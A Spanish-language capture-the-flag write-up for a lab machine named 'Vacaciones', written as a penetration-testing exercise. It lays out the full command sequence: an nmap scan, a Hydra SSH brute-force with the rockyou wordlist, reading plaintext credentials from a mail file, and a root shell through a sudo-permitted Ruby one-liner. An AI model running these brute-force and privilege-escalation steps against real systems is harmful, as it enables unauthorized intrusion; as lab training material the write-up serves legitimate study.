Writeup - Máquina "Vacaciones"
Reconocimiento Inicial
Escaneamos los puertos de la máquina objetivo:

bash
sudo nmap -sS -sV 172.17.0.2
Encontramos dos servicios activos:

Puerto 22 - SSH

Puerto 80 - HTTP

Enumeración del Servicio Web
Al acceder al sitio web en el puerto 80, interceptamos el tráfico con Burp Suite. Cambiando el método HTTP de GET a POST, descubrimos un comentario oculto en el código HTML:

text
<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
Este comentario revela la existencia de dos usuarios:

Camilo

Juan

Ataque de Fuerza Bruta a SSH
Utilizando Hydra, realizamos un ataque de fuerza bruta contra el usuario Camilo en el servicio SSH:

bash
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
La contraseña encontrada es: password1

Nos conectamos por SSH con estas credenciales:

bash
ssh camilo@192.168.x.x
Escalada a Usuario Camilo
Una vez dentro como Camilo, revisamos sus privilegios:

bash
sudo -l
No tiene permisos sudo, pero recordamos el comentario sobre un "correo". Investigamos el directorio de correos del sistema:

bash
ls -la /var/mail/
cat /var/mail/juan.txt
El contenido del correo es:

text
Hola Camilo,

Te dejo mis credenciales por si las necesitas:
Usuario: juan
Contraseña: 2k84dicb

Saludos,
Juan
Movimiento Lateral a Usuario Juan
Usamos las credenciales obtenidas para conectarnos como Juan:

bash
ssh juan@192.168.x.x
Escalada Final a Root
Verificamos los privilegios sudo del usuario Juan:

bash
sudo -l
El resultado muestra:

text
User juan may run the following commands on c8c04d750b1b:
    (ALL) NOPASSWD: /usr/bin/ruby
¡Tenemos la capacidad de ejecutar Ruby como root sin contraseña!

Ejecutamos el comando para obtener una shell como root:

bash
sudo ruby -e 'exec "/bin/bash"'
Obtenemos acceso root:

bash
whoami
# root
Resumen de Credenciales
Camilo: password1

Juan: 2k84dicb

Root: Obtenido mediante escalada de privilegios

Conclusión
La máquina "Vacaciones" presenta varias vulnerabilidades:

Información sensible en comentarios HTML que guía el ataque

Contraseña débil del usuario Camilo susceptible a fuerza bruta

Credenciales almacenadas en texto plano en /var/mail/

Configuración insegura de sudo que permite ejecutar Ruby como root sin contraseña

La ruta de explotación fue clara: información oculta → fuerza bruta → movimiento lateral → escalada de privilegios mediante sudo mal configurado.

Máquina completada exitosamente.

